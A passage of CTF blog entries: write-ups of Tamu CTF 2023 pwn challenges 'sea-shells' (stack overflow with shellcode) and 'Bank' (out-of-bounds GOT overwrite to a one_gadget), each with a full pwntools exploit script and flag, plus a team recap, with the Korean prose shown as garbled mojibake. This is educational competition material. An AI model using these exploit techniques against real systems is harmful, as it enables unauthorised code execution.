        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1914">https://ctftime.org/event/1914</a></li></ul><blockquote><p>Sally sold some seashells by the seashore. Try to guess how many she sold, I bet you will never be able to!<br>Author: <code>_mac_</code></p></blockquote><ul><li>[74 solves &#x2F; 447 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>Î∞îÏù¥ÎÑàÎ¶¨ÏôÄ ÏÜåÏä§ÏΩîÎìúÍ∞Ä Ï†úÍ≥µÎêúÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p><code>NX disabled</code>Ïù¥Í∏∞ ÎïåÎ¨∏Ïóê shellcode Ïã§ÌñâÏù¥ Í∞ÄÎä•ÌïòÎã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">check</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> n, <span class="type">unsigned</span> <span class="type">long</span> sold)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((n &amp; <span class="number">0xffff</span>) == (sold &amp; <span class="number">0xffff</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> num_sold;</span><br><span class="line">    <span class="type">char</span> resp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> a;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> b;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> c;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> d;</span><br><span class="line">    </span><br><span class="line">    num_sold = rand();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;It&#x27;s not that easy though, enter 4 numbers to use to guess!\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">// ask user for input</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1st number: &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lu&quot;</span>, &amp;a);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2nd number: &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lu&quot;</span>, &amp;b);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;3rd number: &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lu&quot;</span>, &amp;c);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;4th number: &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lu&quot;</span>, &amp;d);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// perform some calculations on the numbers</span></span><br><span class="line">        d = d + c;</span><br><span class="line">        c = c ^ b;</span><br><span class="line">        b = b - a;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (check(d, num_sold)) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Woohoo! That&#x27;s exactly how many she sold!\n&quot;</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Here&#x27;s a little something Sally wants to give you for your hard work: %lx\n&quot;</span>, &amp;d);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Sorry, that&#x27;s not quite right :(\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// go again?</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Would you like to guess again? (y/n) &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;resp);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">while</span> (resp == <span class="string">&#x27;Y&#x27;</span> || resp == <span class="string">&#x27;y&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">welcome</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Sally sold some sea SHELLS!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Try to guess exactly how many she sold, I bet you can&#x27;t!!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    welcome();</span><br><span class="line">    vuln();</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&#x27;bye now&#x27;\n-Sally\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÏïÑÎûòÏóêÏÑú bofÍ∞Ä Î∞úÏÉùÌïúÎã§. ÏôúÎÉêÎ©¥ <code>%s</code>Î°ú ÏûÖÎ†•Î∞õÍ∏∞ ÎïåÎ¨∏.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Would you like to guess again? (y/n) &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;resp);</span><br></pre></td></tr></table></figure><p>Í∑∏ Ï†ÑÏóê <code>check(d, num_sold)</code>ÏùÑ ÌÜµÍ≥ºÌïòÎ©¥ <code>d</code> Î≥ÄÏàòÏùò Ï£ºÏÜåÎ•º ÏïåÎ†§Ï§ÄÎã§. Ïù¥ Ï£ºÏÜåÎäî Ïä§ÌÉù Ï£ºÏÜåÏù¥Í∏∞ ÎïåÎ¨∏Ïóê Ïì∏Îç∞Í∞Ä ÎßéÎã§. <code>check(d, num_sold)</code>ÏùÑ ÌÜµÍ≥ºÌïòÍ∏∞ ÏúÑÌï¥ <code>num_sold = rand();</code>ÏùÑ ÏòàÏÉÅÌï¥Ïïº ÌïòÎäîÎç∞, Ïù¥Îäî <code>seed</code>Í∞Ä ÏóÜÍ∏∞ ÎïåÎ¨∏Ïóê Ìï≠ÏÉÅ ÏùºÏ†ïÌïòÎã§. Ï≤òÏùåÏóê 2Î∞îÏù¥Ìä∏ Î∏åÎ£®Ìä∏Ìè¨Ïã±ÏùÑ Ïù¥Ïö©ÌïòÏó¨ Í∞íÏùÑ ÏòàÏ∏°ÌïòÎ†§Í≥† ÌñàÏúºÎÇò, Í≥ÑÏÜç Ïã§ÌñâÌïòÍ≥† ÌÖåÏä§Ìä∏ÌïòÎã§ Î≥¥Îãà <code>0x4500</code>ÏúºÎ°ú ÏùºÏ†ïÌïú Í≤ÉÏùÑ ÌôïÏù∏ÌñàÍ≥†, ÏÑúÎ≤ÑÎèÑ ÎèôÏùºÌñàÎã§.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p><code>rbp+8</code>ÏùÄ <code>ret</code>Ïù¥Îã§. Ïö∞Î¶¨Îäî ÌòÑÏû¨ shellcodeÎ•º Ïã§ÌñâÏãúÌÇ¨ Ïàò ÏûàÎã§. <code>ret</code> Îí§Ïóê shellcodeÎ•º ÏúÑÏπòÏãúÏºúÏ£ºÏûê. shellcodeÍ∞Ä Ï†ÄÏû•Îêú Ï£ºÏÜåÎ•º <code>ret</code>Ïóê ÎÑ£Ïñ¥Ï£ºÏûê. Ïö∞Î¶¨Îäî Ïä§ÌÉù Ï£ºÏÜåÎ•º ÏïåÍ≥† ÏûàÍ∏∞ ÎïåÎ¨∏Ïóê Í∞ÄÎä•ÌïòÎã§. </p><p>Ï∞∏Í≥†Î°ú shellcodeÎ•º Ïã§ÌñâÏãúÌÇ¨ Îïå Ïä§ÌÉùÏù¥ Î™®ÏûêÎûÑ ÏàòÎèÑ ÏûàÍ∏∞ ÎïåÎ¨∏Ïóê <code>sub rsp, 0x100</code> Ïù¥ Ïñ¥ÏÖàÎèÑ Í∞ôÏù¥ Ïã§ÌñâÏãúÏº∞Îã§.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;sea-shells&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./sea-shells&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./sea-shells&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x7fff</span>):</span><br><span class="line">    i = <span class="number">0x4500</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    <span class="comment"># info(hex(i))</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">    result = p.recvline()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;Woohoo&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">        info(<span class="built_in">hex</span>(i))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendline(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;work: &#x27;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(p.recvline(), <span class="number">16</span>)</span><br><span class="line">info(<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span>.ljust(<span class="number">32</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh()).ljust(32, b&#x27;\0&#x27;)</span></span><br><span class="line"></span><br><span class="line">values = struct.unpack(<span class="string">&#x27;4Q&#x27;</span>, shellcode)</span><br><span class="line"><span class="built_in">print</span>(values)       </span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(values[<span class="number">3</span>])) <span class="comment"># 1</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(values[<span class="number">2</span>])) <span class="comment"># 2</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(values[<span class="number">1</span>])) <span class="comment"># 3</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(values[<span class="number">0</span>])) <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x9</span> + <span class="number">0x8</span>)</span><br><span class="line">payload += p64(leak + <span class="number">0x40</span>)</span><br><span class="line">payload += asm(<span class="string">&#x27;sub rsp, 0x100\n&#x27;</span> + shellcraft.sh())</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gigem&#123;cr34t1v3_5h3llc0d3_ftw&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Tamu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tamu CTF 2023 - Bank (pwn, oob write)</title>
      <link href="/230503-tamu2023-6.Bank-pwn/"/>
      <url>/230503-tamu2023-6.Bank-pwn/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1914">https://ctftime.org/event/1914</a></li></ul><blockquote><p>I came up with this banking system that lets you deposit as much as you want. I‚Äôm not sure why, but my friend said it was a terrible idea‚Ä¶<br>Author: nhwn</p></blockquote><ul><li>[68 solves &#x2F; 456 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>Î∞îÏù¥ÎÑàÎ¶¨ÏôÄ ÏÜåÏä§ÏΩîÎìúÎ•º Ï†úÍ≥µÌï¥Ï§ÄÎã§. libcÎèÑ Ï†úÍ≥µÌï¥Ï§¨Îã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> accounts[<span class="number">100</span>];</span><br><span class="line"><span class="type">char</span> exit_msg[] = <span class="string">&quot;Have a nice day!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">deposit</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> amount = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter the number (0-100) of the account you want to deposit in: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;index);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter the amount you want to deposit: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%ld&quot;</span>, &amp;amount);</span><br><span class="line">    accounts[index] += amount;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    deposit();</span><br><span class="line">    deposit();</span><br><span class="line">    <span class="built_in">puts</span>(exit_msg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>accounts[index] += amount;</code> ÏóêÏÑú <code>index</code> Í≤ÄÏÇ¨Î•º ÌïòÏßÄ ÏïäÍ∏∞ ÎïåÎ¨∏Ïóê <code>oob write</code>Í∞Ä Î∞úÏÉùÌïúÎã§. Í∞ÑÎã®Ìïú ÏÜåÏä§ÏΩîÎìúÏù¥Îã§.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p><code>accounts</code>Îäî bss ÏòÅÏó≠Ïóê ÏûàÍ∏∞ ÎïåÎ¨∏Ïóê <code>puts@got</code>Î•º Ïûò Ï°∞Ï†àÌï¥ÏÑú <code>onegadget</code> Ïò§ÌîÑÏÖãÏúºÎ°ú ÎßåÎì§Ïûê!</p><p><code>puts@got</code>Í∞Ä ÏúÑÏπòÌïú Í≥≥Ïóî Ïñ¥ÎñªÍ≤å Ï†ëÍ∑ºÌïòÎäêÎÉê? <code>oob</code>Í∞Ä Î∞úÏÉùÌïòÍ∏∞ ÎïåÎ¨∏Ïóê <code>index</code>Î•º Ïù¥Ïö©Ìï¥ÏÑú Ï∂©Î∂ÑÌûà Ï†ëÍ∑º Í∞ÄÎä•ÌïòÎã§.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;bank&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./bankp&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">one_gadget_off = [<span class="number">0x4497f</span>, <span class="number">0x449d3</span>, <span class="number">0xe5306</span>]</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;-16&#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">off =  one_gadget_off[<span class="number">0</span>] - <span class="number">0x71a40</span> </span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(off))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gigem&#123;a_v3ry_h3fty_d3p0s1t&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Tamu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oob </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tamu CTF 2023 review</title>
      <link href="/230430-tamu2023-0review/"/>
      <url>/230430-tamu2023-0review/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1914">https://ctftime.org/event/1914</a></li><li><a href="https://github.com/tamuctf/tamuctf-2023">https://github.com/tamuctf/tamuctf-2023</a></li></ul><p>Ïù¥Î≤à Ï£ºÎßêÏóê Ïò§ÎûúÎßåÏóê Ï†ÑÎ†•(?)ÏúºÎ°ú posixÏôÄ Ìï®Íªò CTFÏóê Ï∞∏Ïó¨ÌñàÎã§. ÏõêÎûò Í∞ÅÏûê Ìè¨ÎÑàÎ∏îÎßå ÌíÄÏñ¥ÏÑú Í∑∏ÎÉ• Îî∞Î°ú Ï∞∏Ïó¨ÌñàÏóàÎäîÎç∞ Ïù¥Î≤àÏóêÎäî Ï≤òÏùåÏúºÎ°ú Í∞ôÏùÄ ÌåÄÏúºÎ°ú Ï∞∏Ïó¨ÌñàÎã§. ÎÇòÎäî ÌèâÏÜåÏóê Ìè¨ÎÑàÎ∏îÎßå Í±¥ÎìúÎ†§ÏÑú ÌíÄÏù¥ ÏÜçÎèÑÍ∞Ä ÎäêÎ¶¨ÎçîÎùºÎèÑ Ìè¨ÎÑàÎ∏î ÏúÑÏ£ºÎ°ú ÌíÄÍ≥† Ïã∂ÏóàÏóàÎäîÎç∞ posixÍ∞Ä ÎÇòÏóêÍ≤å Ìè¨ÎÑàÎ∏îÏùÑ ÏñëÎ≥¥Ìï¥Ï§òÏÑú Í∑∏Î†áÍ≤å Ìï† Ïàò ÏûàÏóàÎã§. ÌåÄ Î™ÖÏùÄ ÏïÑÎ¨¥Í±∞ÎÇò ÌïòÎùºÍ≥† Ìï¥ÏÑú ÎÇ¥ ÎãâÎÑ¥ÏúºÎ°ú ÌïòÏòÄÎã§. (ÏãúÏûëÌïòÍ∏∞ Ï†ÑÏóê Î¨ºÏñ¥Î¥§ÎäîÎç∞ Ìï¥ÎèÑ ÎêúÎã§Í≥† ÌñàÎã§.„Öé)</p><img src="/images/230430-tamu2023-0review/1.png" width=700/><br><p>Í≤∞Í≥ºÏ†ÅÏúºÎ°ú Ïö∞Î¶¨Îäî 10Îì±ÏùÑ Ìï† Ïàò ÏûàÏóàÎã§! ÏõêÎûòÎäî 14Îì±ÏØ§Ïù¥ÏóàÎäîÎç∞ ÎßâÌåêÏóê ÌÅ¨Î¶ΩÌÜ† Î¨∏Ï†úÎ•º Ìï¥Í≤∞Ìï¥ÏÑú 10Îì±Ïóê ÏïàÏ∞©Ìï† Ïàò ÏûàÏóàÎã§.</p><img src="/images/230430-tamu2023-0review/2.png" width=700/><br><p>posixÍ∞Ä ÏÇ¨Ïã§ Í±∞Ïùò Îã§ ÌíÄÏóàÎã§. ÏõπÏù¥Îûë Î¶¨Î≤ÑÏã±ÏùÑ Ï∫êÎ¶¨Ìï¥Ï§¨Îã§. ÎÇ¥Í∞Ä Ïù∏Ï¶ùÌïú Î¨∏Ï†úÎäî Î™©Î°ùÏùÄ ÏïÑÎûòÏôÄ Í∞ôÎã§.</p><img src="/images/230430-tamu2023-0review/3.png" width=700/><br><img src="/images/230430-tamu2023-0review/4.png" width=700/><br><p>Îπ®Í∞ÑÏÉâ ÎÑ§Î™®Îäî ÎÇ¥Í∞Ä ÌíÄÍ≥† Ïù∏Ï¶ùÌñàÍ≥†, ÌååÎûÄÏÉâ ÎÑ§Î™®Îäî Ïó¥Ïã¨Ìûà Î∂ÑÏÑùÌñàÏßÄÎßå ÌíÄÏßÄ Î™ªÌïú Í≤ΩÏö∞, ÌòπÏùÄ Í∞ôÏù¥ Î∂ÑÏÑùÌïòÎã§Í∞Ä posixÍ∞Ä Î®ºÏ†Ä ÌíÄÏñ¥ÏÑú Ïù∏Ï¶ùÌïú Í≤ΩÏö∞, ÌòπÏùÄ posixÍ∞Ä Í±∞Ïùò Îã§ Î∂ÑÏÑùÌñàÏßÄÎßå ÎÇ¥Í∞Ä flagÎ•º Ï∞æÏïÑÏÑú Ïù∏Ï¶ùÌïú Í≤ΩÏö∞Ïù¥Îã§.<br>(Ìè¨ÎÑàÎ∏î Ï≤´Î≤àÏß∏ Î¨∏Ï†ú Í±∞Ïùò 10Î∂ÑÏª∑Ìï¥ÏÑú ÎÇ¥Í∞Ä ÌçºÎ∏îÎ®πÏóàÎã§. „Öé Ìè¨ÎÑàÎ∏î Ï≤´Î≤àÏß∏ Î¨∏Ï†ú ÌíÄÍ≥† Îî¥Í±∞ÌïòÎü¨ Í∞îÎã§.)</p><p>Ïù¥Î≤à Í∏∞ÌöåÎ°ú ÌÅ¨Î¶ΩÌÜ†Ïóê ÎåÄÌïú Ìù•ÎØ∏Í∞Ä ÏïÑÏ£º ÏÇ¥Ïßù ÏÉùÍ≤ºÎã§. Ïù¥ Ïî®ÌÖùÏùÑ ÌÜµÌï¥ md5 collisionÍ≥º prng, lcg ÏïåÍ≥†Î¶¨Ï¶òÏóê ÎåÄÌï¥ ÏÉàÎ°≠Í≤å ÏïåÍ≤åÎêòÏóàÎã§. ÎçïÎ∂ÑÏóê Î∏îÎ°úÍ∑∏ ÏµúÏ¥à ÌÅ¨Î¶ΩÌÜ† Î°∏ÏóÖÏùÑ ÏûëÏÑ±Ìï¥Î≥¥Î†§Í≥† ÌïúÎã§. ÌÅ¨Î¶ΩÌÜ† Î¨∏Ï†ú ÌíÄÎ©¥ÏÑú ÎåÄÌöå ÎÅùÎÇòÍ∏∞ 1ÏãúÍ∞Ñ Ï†ÑÏóê ChatGPTÌïúÌÖå Ïù¥Í≤ÉÏ†ÄÍ≤É Î¨ºÏñ¥Î≥¥Í≥† ÌûåÌä∏ ÏñªÏñ¥ÏÑú <code>prng</code> Î¨∏Ï†úÎ•º Î∞îÎ°ú ÌíÄ Ïàò ÏûàÏóàÎã§. „Öã„Öã 